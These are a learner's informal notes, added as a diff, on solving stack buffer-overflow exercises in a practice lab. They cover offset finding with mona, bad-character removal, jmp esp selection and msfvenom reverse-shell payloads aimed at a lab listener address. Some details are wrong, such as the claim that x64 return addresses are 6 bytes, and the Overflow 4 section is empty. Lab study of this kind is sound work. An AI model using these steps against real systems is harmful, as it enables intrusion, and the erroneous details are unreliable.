@@ -1,0 +1,206 @@
+
+
+Buffer Overflow Prep
+======================
+
+On your Desktop there should be a folder called "vulnerable-apps". Inside this folder are a number of binaries which are vulnerable to simple stack based buffer overflows (the type taught on the PWK/OSCP course):
+
+    - The SLMail installer.
+    - The brainpan binary.
+    - The dostackbufferoverflowgood binary.
+    - The vulnserver binary.
+    - A custom written "oscp" binary which contains 10 buffer overflows, each with a different EIP offset and set of badchars.
+
+The good thing is, this is a free room.
+
+
+Overflow 1
+============
+
+I am gonna use the above material given in the room to solve the first question then I will solve the rest on my own...
+
+Ok so we used fuzzer.py to fuzz the bytes on the application running on port 1337.
+
+Our application crashed at 2000 bytes...
+
+Let's find the offset, by creating a pattern of 2400 bytes, just to be on the safe side..
+	
+	/usr/share/metasploit-framework/tools/exploits/pattern-create.rb -l 2400
+
+So, I pasted the created pattern in exploit.py file, and then ran the exploit... 
+	- On the immunity debugger the application got paused, and I used mona to find the offset in the immunity debugger using:
+
+		!mona findmsp -distance 2400
+
+	I found that the EIP offset was 1978, now let's edit the offset input B's in place of ret address, and see in case our eip changes to 4 B's.
+
+	BINGOOO!!! We got the EIP changed to 42424242 (hex of B)
+
+	Ok let's get the initial value of ESP, don't know, how are we gonna do that but let's do this for now...
+
+	ESP = 019DFA30
+
+	Ohh, Now I see why we took the value of ESP, it's to check for any bad chars, firstly...
+
+The Theory
+------------
+
+Bad chars are what found inside our shellcode, that could break it, and we don't wanna break the execution so we gotta remove them...
+
+	So, what do we do is, firstly generate a list of all the characters in a bytearray ranging from 0x01 to 0xff (i.e. 255 chars; 00 is not there). 
+
+	Create a python script, which can list these for you in a bytearray order...
+
+	Once written copy them into the the payload section of the exploit python script.
+
+Note: This list is for testing whether their are any bad chars for shellcode, so assume it as the actual shellcode(with all that A buffer uptil the offset)... Run the exploit and then the memory will be overflown in the program.
+
+-----------------------------------------------------------------------
+	
+	Now, in immunity debugger use mona to compare the bytearray (that was already created by the mona in the working directory you assigned to it) with your injected payload... How are we gonna do that?
+
+	Well actually, we dont, we just provide a memory address to that start of payload buffer ( the one esp is pointing towards...) 
+		- You might be wondering why is esp pointing towards that buffer... What is esp doing here in the picture? Well I tried to find the answer to that, couldn't find it, yet. Well, I might find the answer at the end of this room, so don't forget to check the "FINAL NOTES" at the end of the room.
+
+	So we type in, 
+		!mona compare -f <path to the bytearray.txt file stored in mona's working directory> -a <address pointed by esp>
+
+	A pop up window comes up, listing you bad chars, that affected the esp register. Remove those bad chars from the byte array and your exploit as well
+
+	Then restart the whole process all over again, and keep removing the bad chars.
+		- Do this until you see the mona screen say "Unmodified", which means the pointing address in esp register didn't change
+
+Finding a jump point
+
+Once found all the characters, our final task on the host machine will be to find a jump point.
+
+With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):
+
+	!mona jmp -r esp -cpb "\x00"
+
+This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. 
+	- You wondering why we do this... The answer is, because the bad chars are harming the execution of our payload in a whole... So when we send the total 'buffer'(containing prefix postfix offset payload padding etc etc.) to the machine and contains any bad chars then our shellcode will be affected too as it's a part of it.
+
+	- Now, another question arises, WHAT DOES BAD CHARS REALLY AFFECT?? Like we know they break our shellcode, but how? What are the bad characters actually doing? (It's not what we discussed above, and it's again one of the beginner question, I am new to all this(after a long time I suppose and forgot most of the things) so I really wanna understand WHAT ARE THESE THINGS FOR REALLL, RIGHT NOW, I AM JUST BELIEVING THAT THESE THINGS EXIST) I don't know the answer to that yet... But may find later while doing practical. You may wanna check the final notes...
+
+	The results should display in the "Log data" window.
+
+	Now, this list of addresses is what you can use as your return address, so feel free to be moody and searching your lucky number.
+
+That's it, all set, now create a shell code with msfvenom and fill in the details and run the final exploit.
+
+	msfvenom -p windows/shell_reverse_tcp -f py -b <list of bad chars without any delimeter> EXITFUNC=thread LHOST LPORT
+
+NOTE: SINCE AN ENCODER WAS USED IN THE CREATION OF THE PAYLOAD, PADDING IS A MUST. USE ATLEAST 16 NOPS (REASON: I DON'T KNOW THE ROOM SUGGESTED)
+
+You received a reverse shell
+
+WOAHOOO SOLVED THE OVERFLOW 1.
+
+Overflow 2
+===========
+
+Initializing the mona's working directory:
+	
+	!mona config -set workingdirectory c:\mona\%p
+
+Found the crash at 700 bytes...
+
+With mona I found the offset to be 634 bytes for EIP and 462 bytes for ESP
+
+	!mona findmsp -distance 1100
+
+Successfully verified the error at EIP address.
+
+Let's hunt for bad characters now...
+
+ESP address pointing to the exploit-bytearray(the shellcode we presumed) was found to be 01adfa30
+
+	!mona compare -f c:\mona\oscp\bytearray.txt -a 01adfa30
+
+Bad characters currenly listed...
+
+	00 23 24 3c 3d 83 84 ba bb
+
+Starting with removing 23
+
+	!mona bytearray -b "\x00\x23" (\x00 was added because to delete something from byte array, you need to specify all the characters once again...)
+
+Ok a weird thing happened, I deleted \x23 from mona's working directory as well as my exploit... Still it is showing me that bad char still exists, but the good thing is 24 is gone. Now list is...
+
+	00 23 3c 3d 83 84 ba bb	
+
+	!mona bytearray -b '\x00\23\x3c'
+
+Now, 3d is gone and left with
+
+	00 23 3c 83 84 ba bb
+
+I speed up the process a little and added \x83 \xba in one go... Which gave me my bad chars...
+	
+	'\x00\x23\x3c\x83\xba'
+
+The strange thing was, I completely removed the bad characters from the code and still I was viewing them in the terminal
+
+	- Lmao, I was comparing it with bytearray.txt not bytearray.bin, n that's that
+
+So now I have bad characters too let's craft a shellcode:
+	
+	msfvenom -p windows/shell_reverse_tcp -b "\x00\x23\x3c\x83\xba" -f py EXITFUNC=thread LHOST=10.2.26.221 LPORT=1234
+
+Now lastly, let's find a jmp address.
+
+	!mona jmp -r esp -cpb <bad chars>
+
+Address: \xBB\x11\x50\x62, seems alright to me
+
+Gotcha! The shell.
+
+Overflow 3
+============
+
+Offset: 1274
+
+Guess there are a lot of badchars here:
+
+	00 01 02 03 04 11 12 40 41 5f 60 b8 b9 ee ef
+
+Skipped...
+
+Overflow 4
+===========
+
+Finding the offset:
+	
+	
+
+
+
+
+
+
+
+FINAL NOTES
+============
+
+In x64 bit, the return address is 6 bytes long, whereas in x32 bit, the addresses are 4 bytes long...
+
+- ONE BAD CHAR CAN ALSO AFFECT THE FOLLOWING BYTE CHAR LIKE, \0x66 is a bad char then, \x67 will also be listed as a possible bad char...
+	- Make sure, you start removing bad chars one by one, and you might see the alternating bad chars disappearing from the mona's result, because they were not bad chars, just casualities affected by those bad chars.
+
+- The answer to the bad chars question I suppose is(the actual answer I have been looking for; I might have asked the wrong question earlier; but this was the answer I was looking for), bad characters break the code because the program interprets them as something they are not. Noob right?? Yeaa, fuck me.
+
+Note: Check out the findings file, to see details on every exploited binary in this room.
+
+
+Mona Commands used in the room:
+
+!mona config -set workingfolder c:\mona\%p
+
+!mona findmsp -distance 600
+
+!mona bytearray -b "\x00" (-b signifies bad character)
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+
+!mona jmp -r esp -cpb "\x00"
